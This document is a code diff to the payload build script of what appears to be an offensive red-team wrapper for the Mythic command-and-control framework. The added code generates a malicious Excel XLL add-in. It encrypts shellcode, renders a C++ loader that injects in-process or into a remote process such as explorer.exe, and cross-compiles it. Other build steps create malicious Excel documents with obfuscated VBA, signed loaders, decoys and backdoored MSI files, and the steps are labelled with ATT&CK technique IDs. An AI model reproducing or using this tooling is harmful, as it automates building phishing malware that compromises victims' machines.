                             PayloadUUID=self.uuid,
-                            StepName="Compiling Shellcode Loader",
+                            StepName="[T1027] - Compiling Shellcode Loader",
                             StepStdout="Failed to Compile Shellcode Loader",
                             StepSuccess=False,
                         ))
@@ -1692,7 +1986,7 @@ generated if none have been entered.""",
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
-                            StepName="Configuring ClickOnce Loader",
+                            StepName="[T1204.002] - Configuring ClickOnce Loader",
                             StepStdout="Generated InjectionConfig.cs with user-defined injection parameters",
                             StepSuccess=True,
                         ))
@@ -1702,7 +1996,7 @@ generated if none have been entered.""",
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
-                            StepName="Configuring ClickOnce Loader",
+                            StepName="[T1204.002] - Configuring ClickOnce Loader",
                             StepStdout=f"Failed to render InjectionConfig.cs: {str(e)}",
                             StepSuccess=False,
                         ))
@@ -1741,7 +2035,7 @@ generated if none have been entered.""",
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
-                            StepName="Compiling ClickOnce Loader",
+                            StepName="[T1027] - Compiling ClickOnce Loader",
                             StepStdout=f"Makefile publish failed",
                             StepSuccess=False,
                         ))
@@ -1773,7 +2067,7 @@ generated if none have been entered.""",
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
-                            StepName="Compiling ClickOnce Loader",
+                            StepName="[T1027] - Compiling ClickOnce Loader",
                             StepStdout="Failed to locate ClickOnce publish output",
                             StepSuccess=False,
                         ))
@@ -1827,7 +2121,7 @@ generated if none have been entered.""",
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
-                            StepName="Compiling ClickOnce Loader",
+                            StepName="[T1027] - Compiling ClickOnce Loader",
                             StepStdout="Failed to locate executable",
                             StepSuccess=False,
                         ))
@@ -1835,7 +2129,7 @@ generated if none have been entered.""",
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
-                        StepName="Compiling ClickOnce Loader",
+                        StepName="[T1027] - Compiling ClickOnce Loader",
                         StepStdout="ClickOnce Loader Compiled!",
                         StepSuccess=True,
                     ))
@@ -1911,7 +2205,7 @@ generated if none have been entered.""",
 
                     await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
-                        StepName="Sign Shellcode Loader",
+                        StepName="[T1553.006] - Sign Shellcode Loader",
                         StepStdout=f"Success: {success_msg}",
                         StepSuccess=True
                     ))
@@ -1919,7 +2213,7 @@ generated if none have been entered.""",
                 except Exception as e:
                     await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
-                        StepName="Sign Shellcode Loader",
+                        StepName="[T1553.006] - Sign Shellcode Loader",
                         StepStdout=f"Signing Failed: {str(e)}",
                         StepSuccess=False
                     ))
@@ -1954,7 +2248,7 @@ generated if none have been entered.""",
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                                 PayloadUUID=self.uuid,
-                                StepName="Creating Decoy",
+                                StepName="[T1036.008] - Creating Decoy",
                                 StepStdout=f"Replaced default decoys with custom file: {custom_filename}",
                                 StepSuccess=True
                             ))
@@ -1963,7 +2257,7 @@ generated if none have been entered.""",
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                                 PayloadUUID=self.uuid,
-                                StepName="Creating Decoy",
+                                StepName="[T1036.008] - Creating Decoy",
                                 StepStdout=f"Failed to process custom decoy: {str(e)}",
                                 StepSuccess=False
                             ))
@@ -1971,7 +2265,7 @@ generated if none have been entered.""",
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
-                            StepName="Creating Decoy",
+                            StepName="[T1036.008] - Creating Decoy",
                             StepStdout="Using default decoy files.",
                             StepSuccess=True
                         ))
@@ -1983,7 +2277,7 @@ generated if none have been entered.""",
                 await SendMythicRPCPayloadUpdatebuildStep(
                     MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
-                        StepName="Creating MalDoc",
+                        StepName="[T1566.001] - Creating MalDoc",
                         StepStdout="Skipping MalDoc Generation (Trigger selected as source).",
                         StepSuccess=True
                     ))
@@ -1995,6 +2289,7 @@ generated if none have been entered.""",
                 doc_name = self.get_parameter("0.9d Excel Document Name")
                 obfuscate = self.get_parameter("0.9e Obfuscate VBA")
                 injection_type = self.get_parameter("0.9f MalDoc Injection Type")
+                xll_payload_type = self.get_parameter("0.9h XLL Payload Type")
 
                 try:
                     # Generate VBA payload code based on injection type
@@ -2099,7 +2394,423 @@ generated if none have been entered.""",
                             target_process=target_process
                         )
 
-                    if obfuscate:
+                    # ==================== XLL (Excel Add-In DLL) Generation ====================
+                    if xll_payload_type == "XLL Add-In DLL":
+                        # Generate C/C++ source code for XLL DLL instead of VBA macro
+                        await SendMythicRPCPayloadUpdatebuildStep(
+                            MythicRPCPayloadUpdateBuildStepMessage(
+                                PayloadUUID=self.uuid,
+                                StepName="[T1559.002] - Generating XLL DLL",
+                                StepStdout="Generating C/C++ XLL source code...",
+                                StepSuccess=True
+                            ))
+
+                        # Get XLL-specific parameters
+                        xll_injection_method = self.get_parameter("0.9i XLL Injection Method")
+                        xll_target_process = self.get_parameter("0.9j XLL Target Process")
+                        xll_compiler = self.get_parameter("0.9k XLL Compiler")
+                        xll_guardrail_includes = (self.get_parameter("0.9l XLL Guardrail Includes") or "").strip()
+                        xll_guardrail_code = (self.get_parameter("0.9m XLL Guardrail Code") or "").strip()
+                        xll_guardrail_extra_libs = (self.get_parameter("0.9n XLL Guardrail Extra Libs") or "").strip()
+                        xll_guardrail_extra_libs_list = shlex.split(xll_guardrail_extra_libs) if xll_guardrail_extra_libs else []
+
+                        # Map injection method names for template
+                        injection_method_map = {
+                            "CreateThread (In-Process)": "CreateThread",
+                            "ProcessInject (Remote)": "ProcessInject"
+                        }
+                        template_injection_method = injection_method_map.get(xll_injection_method, "CreateThread")
+
+                        # Generate XLL shellcode using shellcrypt
+                        output += "[*] Processing shellcode for XLL injection...\n"
+                        
+                        shellcrypt_cmd = [
+                            "python",
+                            shellcrypt_path,
+                            "-i", mythic_shellcode_path,
+                            "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
+                            "-f", "c",
+                            "-a", "shellcode",
+                            "-o", str(xll_shellcode_path)
+                        ]
+
+                        if self.get_parameter("2.2 Encryption Key") != "NONE":
+                            shellcrypt_cmd += ["-k", self.get_parameter("2.2 Encryption Key")]
+
+                        if self.get_parameter("2.0 Compression Type") != "NONE":
+                            shellcrypt_cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]
+
+                        # Run shellcrypt to generate shellcode directly to xll_shellcode.h
+                        try:
+                            subprocess.check_output(shellcrypt_cmd, text=True)
+                            output += f"[+] Shellcrypt generated xll_shellcode.h\n"
+                        except subprocess.CalledProcessError as e:
+                            output += f"[-] Shellcrypt failed: {str(e)}\n"
+                            raise
+
+                        # Wrap shellcrypt output with header guards
+                        if xll_shellcode_path.exists():
+                            shellcrypt_content = xll_shellcode_path.read_text()
+                            wrapped_content = f'''#ifndef EREBUS_XLL_SHELLCODE_H
+#define EREBUS_XLL_SHELLCODE_H
+#pragma once
+
+#include <stddef.h>
+
+{shellcrypt_content}
+
+static size_t shellcode_len = sizeof(shellcode);
+static size_t key_len = sizeof(key);
+
+#endif
+'''
+                            xll_shellcode_path.write_text(wrapped_content)
+                            output += f"[+] Wrapped shellcode header with guards\n"
+                        else:
+                            output += "[-] Shellcrypt output file not created\n"
+                            raise RuntimeError("Shellcrypt failed to create output file")
+
+                        xll_injection_mode = 0 if xll_injection_method == "CreateThread (In-Process)" else 1
+                        xll_target_process_escaped = xll_target_process.replace("\\", "\\\\")
+
+                        template_dir = Path(__file__).resolve().parent.parent / "agent_code" / "erebus_xll"
+
+                        def _render_xll_template(template_path: Path, replace_map: dict) -> str:
+                            content = template_path.read_text()
+                            for token, value in replace_map.items():
+                                content = content.replace(token, value)
+                            return content
+
+                        replacements = {
+                            "{{XLL_ENCRYPTION_TYPE}}": str(encryption_type_value if encryption_type_value else 0),
+                            "{{XLL_INJECTION_METHOD}}": str(xll_injection_mode),
+                            "{{XLL_TARGET_PROCESS}}": xll_target_process_escaped,
+                            "{{XLL_XLL_FILENAME}}": f"{doc_name}.xll",
+                            "{{XLL_XLSX_FILENAME}}": f"{doc_name}.xlsx",
+                            "{{XLL_ZIP_FILENAME}}": f"{doc_name}.zip",
+                        }
+
+                        xll_config_path.write_text(
+                            _render_xll_template(template_dir / "xll_config.h", replacements)
+                        )
+
+                        # Load Jinja2 template for XLL
+                        template_dir = Path(__file__).parent.parent / "agent_code" / "erebus_xll"
+                        env = Environment(loader=FileSystemLoader(str(template_dir)))
+                        template = env.get_template("xll_payload.j2")
+
+                        # Render template with context
+                        template_context = {
+                            "encryption_type": encryption_type_value if encryption_type_value else "NONE",
+                            "injection_method": template_injection_method,
+                            "injection_method_name": xll_injection_method,
+                            "target_process": xll_target_process if xll_injection_method == "ProcessInject (Remote)" else "explorer.exe",
+                            "generation_timestamp": datetime.now().isoformat(),
+                            "vba_encryption_type": encryption_type_value if encryption_type_value else "NONE",
+                            "guardrail_includes": xll_guardrail_includes,
+                            "guardrail_code": xll_guardrail_code
+                        }
+
+                        xll_source = template.render(template_context)
+
+                        # Save XLL source to temporary file
+                        xll_source_path.write_text(xll_source)
+
+                        output += f"[+] Generated XLL source: {xll_source_path.name}\n"
+                        output += f"[*] Source size: {len(xll_source)} bytes\n"
+                        output += f"[*] Encryption type: {encryption_type_value}\n"
+                        output += f"[*] Injection method: {xll_injection_method}\n"
+
+                        # Generate xll_config.h with configuration macros
+                        xll_config_path = xll_build_dir / "xll_config.h"
+                        injection_method_macro = "0" if xll_injection_method == "Self-injection (Local)" else "1"
+                        encryption_type_macro = {
+                            "NONE": "0",
+                            "XOR": "1",
+                            "RC4": "2"
+                        }.get(encryption_type_value or "NONE", "0")
+
+                        target_process = xll_target_process if xll_injection_method == "ProcessInject (Remote)" else "explorer.exe"
+
+                        xll_config_content = f'''#ifndef EREBUS_XLL_CONFIG_H
+#define EREBUS_XLL_CONFIG_H
+#pragma once
+
+#include <windows.h>
+
+// Encryption: 0 = NONE, 1 = XOR, 2 = RC4
+#define XLL_ENCRYPTION_TYPE {encryption_type_macro}
+
+// Injection: 0 = CreateThread (self), 1 = ProcessInject (remote)
+#define XLL_INJECTION_METHOD {injection_method_macro}
+
+#define XLL_TARGET_PROCESS L"{target_process}"
+
+#define XLL_XLL_FILENAME L"payload.xll"
+#define XLL_XLSX_FILENAME L"payload.xlsx"
+#define XLL_ZIP_FILENAME L"payload.zip"
+
+#endif
+'''
+                        xll_config_path.write_text(xll_config_content)
+                        output += f"[+] Generated xll_config.h\n"
+
+                        try:
+                            try:
+                                from erebus_wrapper.erebus_wrapper.agent_code.Erebus.Helper.main import WindowsCompiler
+
+                                # Set up architecture based on build parameters
+                                xll_architecture = "x64" # Could be parameterized if needed
+
+                                compiler = WindowsCompiler(
+                                    compiler=xll_compiler,
+                                    architecture=xll_architecture,
+                                    optimization='Ox',
+                                    verbose=True
+                                )
+
+                                # Compile to XLL
+                                xll_output_path = payload_dir / f"{doc_name}.xll"
+                                success = compiler.compile_xll(
+                                    source_file=str(xll_source_path),
+                                    output_file=str(xll_output_path),
+                                    extra_libs=xll_guardrail_extra_libs_list
+                                )
+
+                                if success:
+                                    if not xll_output_path.exists():
+                                        alt_xll_path = xll_build_dir / f"{doc_name}.xll"
+                                        if alt_xll_path.exists():
+                                            shutil.copy2(alt_xll_path, xll_output_path)
+
+                                if xll_output_path.exists():
+                                    output += f"[+] Successfully compiled XLL: {xll_output_path.name}\n"
+                                    output += f"[*] XLL size: {xll_output_path.stat().st_size} bytes\n"
+
+                                    # Create clean XLSX from template and delete XLL
+                                    try:
+                                        clean_xlsx_path = self.cleanup_xll_and_create_clean_xlsx(
+                                            str(xll_output_path),
+                                            doc_name,
+                                            payload_dir
+                                        )
+                                        output += f"[+] Created clean XLSX: {os.path.basename(clean_xlsx_path)}\n"
+                                        output += f"[+] Deleted XLL file (execution complete)\n"
+                                    except Exception as e:
+                                        output += f"[!] Warning: Failed to cleanup XLL: {str(e)}\n"
+
+                                    await SendMythicRPCPayloadUpdatebuildStep(
+                                        MythicRPCPayloadUpdateBuildStepMessage(
+                                            PayloadUUID=self.uuid,
+                                            StepName="[T1559.002] - Compiling XLL DLL",
+                                            StepStdout=f"Compiled XLL: {xll_output_path.name}",
+                                            StepSuccess=True
+                                        ))
+                                else:
+                                    output += "[-] XLL compilation failed\n"
+                                    raise RuntimeError("XLL compilation returned failure status")
+
+                                # Save source for reference
+                                xll_source_ref = payload_dir / f"{doc_name}.cpp"
+                                shutil.copy(str(xll_source_path), str(xll_source_ref))
+                                output += f"[*] Source code saved to: {xll_source_ref.name}\n"
+
+                            except ImportError:
+                                output += "[*] Windows compiler not available, using Linux cross-compilation (MinGW-w64)...\n"
+
+                                xll_output_path = payload_dir / f"{doc_name}.xll"
+
+                                # Use the working erebus_xll directory for builds
+                                xll_dir = xll_build_dir
+                                if not xll_dir.exists():
+                                    raise RuntimeError(f"XLL build directory not found: {xll_dir}")
+
+                                sdk_zip = xll_dir / "Excel2013XLLSDK.zip"
+                                sdk_dir = xll_dir / "Excel2013XLLSDK"
+
+                                # Check and verify MinGW-w64 availability
+                                check_mingw = subprocess.run(
+                                    ["which", "x86_64-w64-mingw32-g++"],
+                                    capture_output=True,
+                                    text=True
+                                )
+                                if check_mingw.returncode != 0:
+                                    raise RuntimeError(
+                                        "MinGW-w64 cross-compiler not found. Install with: "
+                                        "apt-get install mingw-w64 (Debian/Ubuntu) or brew install mingw-w64 (macOS)"
+                                    )
+                                output += "[+] MinGW-w64 cross-compiler found\n"
+
+                                # Setup SDK if needed and available
+                                if sdk_zip.exists() and not sdk_dir.exists():
+                                    output += "[*] Setting up Excel 2013 XLL SDK...\n"
+                                    try:
+                                        setup_cmd = [
+                                            "make",
+                                            "-f", str(xll_dir / "Makefile"),
+                                            "setup-sdk"
+                                        ]
+                                        setup_result = subprocess.run(
+                                            setup_cmd,
+                                            capture_output=True,
+                                            text=True,
+                                            timeout=60,
+                                            cwd=str(xll_dir)
+                                        )
+                                        if setup_result.returncode == 0:
+                                            output += "[+] SDK extracted successfully\n"
+                                        else:
+                                            output += f"[!] SDK extraction warning: {setup_result.stderr}\n"
+                                    except subprocess.TimeoutExpired:
+                                        output += "[!] SDK setup timed out (may still be extracting)\n"
+                                    except Exception as e:
+                                        output += f"[!] SDK setup failed: {str(e)}\n"
+                                elif sdk_dir.exists():
+                                    output += f"[+] Excel SDK already extracted at: {sdk_dir}\n"
+                                else:
+                                    output += "[*] Excel SDK not found - will compile without SDK headers (still functional)\n"
+
+                                # Prepare make command with proper paths
+                                make_cmd = [
+                                    "make",
+                                    "-f", str(xll_dir / "Makefile"),
+                                    f"XLL_SOURCE={str(xll_source_path)}",
+                                    f"XLL_OUTPUT={str(xll_output_path)}",
+                                    f"SRCDIR={str(xll_build_dir)}/",
+                                    "ARCH=x64",
+                                    "OPTIMIZATION=O2"
+                                ]
+
+                                # Add SDK path - prefer module directory
+                                if sdk_dir.exists():
+                                    sdk_include = sdk_dir / "INCLUDE"
+                                    if sdk_include.exists():
+                                        make_cmd.append(f"SDK_PATH={str(sdk_include)}")
+
+                                if xll_guardrail_extra_libs:
+                                    make_cmd.append(f"EXTRA_LIBS={xll_guardrail_extra_libs}")
+
+                                output += f"[*] Build directory: {xll_dir}\n"
+                                output += f"[*] Source file: {xll_source_path.name}\n"
+                                output += f"[*] Output file: {xll_output_path.name}\n"
+                                output += f"[*] Build dir: {xll_build_dir}\n"
+                                output += "[*] Compiling XLL with MinGW-w64...\n"
+                                output += f"[DEBUG] Make command: {' '.join(make_cmd)}\n"
+
+                                # Run make compilation
+                                result = subprocess.run(
+                                    make_cmd,
+                                    capture_output=True,
+                                    text=True,
+                                    timeout=300,
+                                    cwd=str(xll_dir)
+                                )
+
+                                # Capture both stdout and stderr for debugging
+                                if result.stdout:
+                                    output += f"[DEBUG] Make stdout:\n{result.stdout}\n"
+                                
+                                if result.stderr:
+                                    output += f"[DEBUG] Make stderr:\n{result.stderr}\n"
+
+                                if result.returncode == 0:
+                                    output += "[+] Make compilation successful\n"
+                                    if not xll_output_path.exists():
+                                        # Try alternate path in build directory
+                                        alt_xll_path = xll_build_dir / f"{doc_name}.xll"
+                                        if alt_xll_path.exists():
+                                            shutil.copy2(str(alt_xll_path), str(xll_output_path))
+                                            output += f"[+] Copied XLL from build directory\n"
+                                else:
+                                    output += f"[!] Make compilation returned non-zero exit code: {result.returncode}\n"
+                                    if result.stderr:
+                                        output += f"[ERROR] Make stderr:\n{result.stderr}\n"
+                                    
+                                    # Debug: Check what files exist in the temp build directory
+                                    output += f"[DEBUG] Files in temp build directory:\n"
+                                    try:
+                                        if xll_build_dir.exists():
+                                            for f in xll_build_dir.iterdir():
+                                                output += f"  - {f.name}\n"
+                                        else:
+                                            output += f"  [!] Temp build directory does not exist: {xll_build_dir}\n"
+                                    except Exception as e:
+                                        output += f"  [!] Error listing directory: {str(e)}\n"
+                                    
+                                    # Debug: Check SDK availability
+                                    output += f"[DEBUG] SDK status:\n"
+                                    if sdk_dir.exists():
+                                        output += f"  [+] Module SDK dir exists: {sdk_dir}\n"
+                                    else:
+                                        output += f"  [-] Module SDK dir not found: {sdk_dir}\n"
+
+                                # Verify compilation was successful
+                                if xll_output_path.exists():
+                                    xll_size = xll_output_path.stat().st_size
+                                    output += f"[+] Successfully compiled XLL via MinGW-w64: {xll_output_path.name}\n"
+                                    output += f"[*] XLL size: {xll_size} bytes\n"
+
+                                    if xll_size < 5000:
+                                        output += f"[!] Warning: XLL size is very small ({xll_size} bytes). Compilation may have failed.\n"
+
+                                else:
+                                    output += f"[-] XLL file not created at expected location: {xll_output_path}\n"
+                                    # Check if it was created in the temp directory instead
+                                    alt_xll_path = xll_build_dir / f"{doc_name}.xll"
+                                    if alt_xll_path.exists():
+                                        output += f"[!] Found XLL in temp directory instead: {alt_xll_path}\n"
+                                        try:
+                                            shutil.copy2(str(alt_xll_path), str(xll_output_path))
+                                            output += f"[+] Copied XLL to expected location\n"
+                                        except Exception as e:
+                                            output += f"[!] Failed to copy: {str(e)}\n"
+                                    else:
+                                        output += f"[DEBUG] XLL not found in temp directory either\n"
+                                        error_msg = f"XLL file not created after compilation.\n"
+                                        if result.stderr:
+                                            error_msg += f"Build errors:\n{result.stderr}"
+                                        elif result.returncode != 0:
+                                            error_msg += f"Make exited with code {result.returncode}"
+                                        else:
+                                            error_msg += "Make reported success but XLL file not found"
+
+                                        output += f"[-] {error_msg}\n"
+                                        raise RuntimeError(f"XLL compilation failed: {error_msg}")
+
+                                # Send success notification
+                                if xll_output_path.exists():
+                                    xll_size = xll_output_path.stat().st_size
+                                    await SendMythicRPCPayloadUpdatebuildStep(
+                                        MythicRPCPayloadUpdateBuildStepMessage(
+                                            PayloadUUID=self.uuid,
+                                            StepName="[T1559.002] - Compiling XLL DLL",
+                                            StepStdout=f"[SUCCESS] Compiled XLL via MinGW-w64: {xll_output_path.name} ({xll_size} bytes)",
+                                            StepSuccess=True
+                                        ))
+
+                                # Save source for reference
+                                try:
+                                    xll_source_ref = payload_dir / f"{doc_name}.cpp"
+                                    shutil.copy(str(xll_source_path), str(xll_source_ref))
+                                    output += f"[*] Source code saved to: {xll_source_ref.name}\n"
+                                except Exception as e:
+                                    output += f"[!] Could not save source reference: {str(e)}\n"
+
+                        except Exception as e:
+                            output += f"[-] XLL compilation error: {str(e)}\n"
+                            await SendMythicRPCPayloadUpdatebuildStep(
+                                MythicRPCPayloadUpdateBuildStepMessage(
+                                    PayloadUUID=self.uuid,
+                                    StepName="[T1559.002] - Generating XLL DLL",
+                                    StepStdout=f"XLL generation failed: {str(e)}",
+                                    StepSuccess=False
+                                ))
+                            raise
+
+                        # Skip VBA obfuscation if using XLL
+                        obfuscate = False
+
+                    if obfuscate and xll_payload_type != "XLL Add-In DLL":
                         vba_code = await self.obfuscate_vba(vba_code)
 
                     # Handle VBA Module Only export
@@ -2128,18 +2839,24 @@ generated if none have been entered.""",
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                                 PayloadUUID=self.uuid,
-                                StepName="Creating MalDoc",
+                                StepName="[T1566.001] - Creating MalDoc",
                                 StepStdout=success_msg,
                                 StepSuccess=True
                             ))
 
                     elif maldoc_type == "Create New":
-                        # Create a new Excel document
+                        # Create a new Excel document from template
                         excel_output = payload_dir / f"{doc_name}.xlsm"
+
+                        # Get template path from templates directory
+                        templates_dir = Path(agent_build_path) / "templates"
+                        template_xlsx = templates_dir / "template.xlsx"
+
                         excel_path = generate_excel_payload(
                             payload_path=str(payload_dir),
                             vba_payload=vba_code,
-                            output_path=excel_output
+                            output_path=excel_output,
+                            template_path=template_xlsx if template_xlsx.exists() else None
                         )
 
                         success_msg = f"Created malicious Excel document: {excel_path.name}"
@@ -2188,7 +2905,7 @@ generated if none have been entered.""",
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
-                            StepName="Creating MalDoc",
+                            StepName="[T1566.001] - Creating MalDoc",
                             StepStdout=success_msg,
                             StepSuccess=True
                         ))
@@ -2197,7 +2914,7 @@ generated if none have been entered.""",
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
-                            StepName="Creating MalDoc",
+                            StepName="[T1566.001] - Creating MalDoc",
                             StepStdout=f"Failed to create/backdoor Excel document: {str(e)}",
                             StepSuccess=False
                         ))
@@ -2212,7 +2929,7 @@ generated if none have been entered.""",
                 await SendMythicRPCPayloadUpdatebuildStep(
                     MythicRPCPayloadUpdateBuildStepMessage(
                     PayloadUUID=self.uuid,
-                    StepName="Adding Trigger",
+                    StepName="[T1137.006] - Adding Trigger",
                     StepStdout="Skipping Trigger Generation (MalDoc selected as source).",
                     StepSuccess=True,
                 ))
@@ -2270,7 +2987,7 @@ generated if none have been entered.""",
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
-                            StepName="Adding Trigger",
+                            StepName="[T1137.006] - Adding Trigger",
                             StepStdout=f"{trigger_type} Trigger created at: {trigger_path}",
                             StepSuccess=True,
                         ))
@@ -2280,7 +2997,7 @@ generated if none have been entered.""",
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
-                        StepName="Adding Trigger",
+                        StepName="[T1137.006] - Adding Trigger",
                         StepStdout=f"CRITICAL ERROR: Failed to create {trigger_type} trigger: {str(e)}",
                         StepSuccess=False,
                     ))
@@ -2292,6 +3009,63 @@ generated if none have been entered.""",
             await self.backdoor_msi_payload(agent_build_path)
 
             ######################### End Of MSI Backdooring Section #########################
+            ######################### Windows Helper Export #########################
+
+            # Export Erebus.Helper for Windows-specific operations
+            try:
+                helper_src = Path(__file__).parent.parent / "erebus_wrapper" / "agent_code" / "Erebus.Helper" / "main.py"
+                helper_dst = Path(agent_build_path) / "Erebus.Helper" / "main.py"
+
+                if helper_src.exists():
+                    helper_dst.parent.mkdir(parents=True, exist_ok=True)
+                    shutil.copy(str(helper_src), str(helper_dst))
+
+                    # Also copy config.ini if it exists
+                    config_src = helper_src.parent / "config.ini"
+                    if config_src.exists():
+                        config_dst = helper_dst.parent / "config.ini"
+                        shutil.copy(str(config_src), str(config_dst))
+
+                    # Copy requirements.txt if it exists
+                    req_src = helper_src.parent / "requirements.txt"
+                    if req_src.exists():
+                        req_dst = helper_dst.parent / "requirements.txt"
+                        shutil.copy(str(req_src), str(req_dst))
+
+                    output += "[+] Exported Erebus.Helper for Windows operations\n"
+
+                    await SendMythicRPCPayloadUpdatebuildStep(
+                        MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName="[T1036] - Exporting Helper",
+                        StepStdout="Exported Erebus.Helper for Windows operations",
+                        StepSuccess=True,
+                    ))
+            except Exception as e:
+                output += f"[!] Warning: Failed to export helper: {str(e)}\n"
+
+            ######################### IOCs Generation #########################
+
+            # Add all files in payload directory to IOCs list
+            if os.path.exists(payload_dir):
+                for root, dirs, files in os.walk(payload_dir):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        self.add_to_iocs(iocs_list, file_path, generation_timestamp)
+
+            # Generate IOCs file
+            iocs_file_path = os.path.join(payload_dir, "IOCs.txt")
+            self.generate_iocs_file(iocs_list, iocs_file_path)
+            output += f"[+] Generated IOCs file: IOCs.txt ({len(iocs_list)} files tracked)\n"
+
+            await SendMythicRPCPayloadUpdatebuildStep(
+                MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="[T1005] - Gathering Files",
+                StepStdout=f"Generated IOCs tracking file with {len(iocs_list)} hashes",
+                StepSuccess=True,
+            ))
+
             ######################### Final Payload / Container #########################
 
             # 1. Capture context for container function
@@ -2331,7 +3105,7 @@ generated if none have been entered.""",
                 await SendMythicRPCPayloadUpdatebuildStep(
                     MythicRPCPayloadUpdateBuildStepMessage(
                     PayloadUUID=self.uuid,
-                    StepName="Containerising",
+                    StepName="[T1027] - Containerising",
                     StepStdout=f"Payload packaged into {container} container",
                     StepSuccess=True,
                 ))
